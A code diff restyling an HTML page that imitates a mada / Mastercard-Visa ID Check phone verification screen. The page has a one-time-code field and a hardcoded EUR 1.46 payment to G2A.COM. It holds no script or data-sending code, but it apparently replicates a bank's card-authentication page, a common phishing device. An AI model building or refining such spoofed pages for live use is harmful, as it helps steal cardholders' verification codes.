@@ -3,147 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Verification Page</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             background-color: #ffffff;
             margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
+            padding: 15px;
+            color: #000;
         }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            text-align: left;
+        .wrapper {
+            max-width: 450px;
+            margin: 0 auto;
         }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        .cancel-btn {
+        /* Header Section */
+        .top-nav {
             text-align: right;
             font-weight: bold;
             font-size: 14px;
-            cursor: pointer;
-            display: block;
-            width: 100%;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
-        .logos img {
-            height: 30px;
+        .header-logos {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 5px;
         }
-        .id-check {
-            font-size: 12px;
-            color: #555;
+        .mada-logo {
+            color: #007bc3;
+            font-weight: bold;
+            font-size: 20px;
+            letter-spacing: -1px;
+        }
+        .card-logos {
             text-align: right;
+            font-size: 10px;
+            color: #666;
+            line-height: 1.2;
         }
         hr {
             border: 0;
-            border-top: 1px solid #ccc;
-            margin-bottom: 20px;
+            border-top: 1px solid #e0e0e0;
+            margin: 10px 0 25px 0;
         }
-        h2 {
+        /* Main Content */
+        h1 {
             font-family: "Times New Roman", Times, serif;
-            font-weight: bold;
-            font-size: 22px;
-            margin-bottom: 20px;
+            font-size: 24px;
+            margin-bottom: 25px;
         }
         p {
-            font-size: 15px;
-            line-height: 1.4;
-            color: #000;
-            margin-bottom: 15px;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
         }
-        .input-group {
-            margin-top: 50px;
+        /* Form Section */
+        .form-container {
             text-align: center;
+            margin-top: 40px;
         }
-        .input-label {
-            display: block;
-            color: #666;
-            margin-bottom: 10px;
+        .label {
+            color: #888;
             font-size: 14px;
+            margin-bottom: 8px;
+            display: block;
         }
         input[type="text"] {
-            width: 80%;
-            padding: 10px;
+            width: 100%;
+            max-width: 320px;
+            height: 45px;
             border: 1px solid #ccc;
-            border-radius: 2px;
+            border-radius: 4px;
             font-size: 18px;
             margin-bottom: 30px;
+            padding: 0 10px;
+            box-sizing: border-box;
         }
         .confirm-btn {
             width: 100%;
-            background-color: #0000FF; /* Pure Blue */
+            background-color: #0000ff;
             color: white;
-            padding: 12px;
             border: none;
-            font-weight: bold;
+            padding: 15px;
             font-size: 16px;
+            font-weight: bold;
+            border-radius: 2px;
             cursor: pointer;
-            letter-spacing: 1px;
             margin-bottom: 40px;
         }
-        .resend-link {
-            display: block;
-            text-align: center;
-            color: #0000FF;
+        .resend {
+            color: #0000ff;
             text-decoration: none;
             font-weight: bold;
             font-size: 14px;
-            margin-bottom: 50px;
+            display: block;
+            margin-bottom: 60px;
         }
-        .footer-links {
-            border-top: 0px solid #eee;
-        }
-        .footer-item {
+        /* Footer Links */
+        .footer-link {
             display: flex;
             justify-content: space-between;
-            color: #00008B;
-            padding: 10px 0;
-            font-size: 14px;
+            padding: 12px 0;
+            color: #1a237e;
             text-decoration: none;
+            font-size: 15px;
+            border-bottom: 0px solid #eee;
         }
+        .plus { font-size: 18px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="cancel-btn">Cancel</div>
+<div class="wrapper">
+    <div class="top-nav">Cancel</div>
     
-    <div class="header">
-        <div class="logo-left">
-            <strong style="color:#0077c8">mada</strong>
-        </div>
-        <div class="logo-right">
-            <span style="font-size: 10px; vertical-align: middle;">Mastercard | Visa</span>
-            <div class="id-check">ID Check</div>
+    <div class="header-logos">
+        <div class="mada-logo">mada</div>
+        <div class="card-logos">
+            Mastercard | Visa<br>
+            <strong>ID Check</strong>
         </div>
     </div>
-
+    
     <hr>
 
-    <h2>Verify By Phone</h2>
+    <h1>Verify By Phone</h1>
 
     <p>We have sent you a text message with a code to your registered mobile number.</p>
     
-    <p>You are paying G2A.COM the amount of EUR 1.46 on 2026/02/15 01:54:11.</p>
+    <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>
 
-    <div class="input-group">
-        <label class="input-label">Verification code</label>
-        <input type="text" id="code">
+    <div class="form-container">
+        <label class="label">Verification code</label>
+        <input type="text">
         <button class="confirm-btn">CONFIRM</button>
+        <a href="#" class="resend">RESEND CODE</a>
     </div>
 
-    <a href="#" class="resend-link">RESEND CODE</a>
-
-    <div class="footer-links">
-        <a href="#" class="footer-item">Learn more about authentication <span>+</span></a>
-        <a href="#" class="footer-item">Need some help ? <span>+</span></a>
+    <div style="margin-top: 20px;">
+        <a href="#" class="footer-link">Learn more about authentication <span class="plus">+</span></a>
+        <a href="#" class="footer-link">Need some help ? <span class="plus">+</span></a>
     </div>
 </div>
 
